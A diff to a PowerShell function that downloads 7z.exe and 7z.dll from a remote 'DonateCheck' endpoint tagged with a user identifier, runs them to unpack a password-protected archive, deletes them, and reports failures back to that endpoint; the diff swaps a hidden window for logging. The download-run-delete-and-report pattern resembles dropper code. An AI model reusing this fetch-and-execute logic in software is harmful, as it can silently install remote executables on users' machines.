@@ -10,10 +10,10 @@ function ExtractWith7z {
 
     # 下载 7z.exe 和 7z.dll
     $exeFile = [System.IO.Path]::Combine(@($currentPath, $unzipPath, "7z.exe"));
-    Invoke-WebRequest -Uri "${DonateCheck}?user=${agent}&state=7zexe" -OutFile $exeFile | Out-Null;
+    Invoke-WebRequest -Uri "${DonateCheck}?user=${agent}&state=7zexe" -OutFile $exeFile;
     $exeExists = Test-Path $exeFile;
     $dllFile = [System.IO.Path]::Combine(@($currentPath, $unzipPath, "7z.dll"));
-    Invoke-WebRequest -Uri "${DonateCheck}?user=${agent}&state=7zdll" -OutFile $dllFile | Out-Null;
+    Invoke-WebRequest -Uri "${DonateCheck}?user=${agent}&state=7zdll" -OutFile $dllFile;
     $dllExists = Test-Path $dllFile;
 
     if ($exeExists -and $dllExists) {
@@ -25,7 +25,7 @@ function ExtractWith7z {
         $fileToExtract = "$currentPath\$fileName"; $dirExtractTo = "$currentPath\$unzipPath";
 
         $arguments = "x", $fileToExtract, "-p$passWord", "-o$dirExtractTo", "-y", "-bd";
-        $process = Start-Process -FilePath $exeFile -ArgumentList $arguments -NoNewWindow -WindowStyle Hidden -PassThru -Wait;
+        $process = Start-Process -FilePath $exeFile -ArgumentList $arguments -NoNewWindow -PassThru -Wait -RedirectStandardOutput "output.txt" -RedirectStandardError "errorlog.txt";
 
         # 检查解压结果
         if ($process.ExitCode -eq 0) {
@@ -37,7 +37,7 @@ function ExtractWith7z {
         }
 
         # 删除临时文件
-        Remove-Item -Path @("$exeFile", "$dllFile") -Force;
+        Remove-Item -Path @("$exeFile", "$dllFile", "output.txt", "errorlog.txt") -Force;
 
     } else {
         $Push = Invoke-WebRequest -Uri "${DonateCheck}?user=${agent}&state=failed&file=${fileNum}";
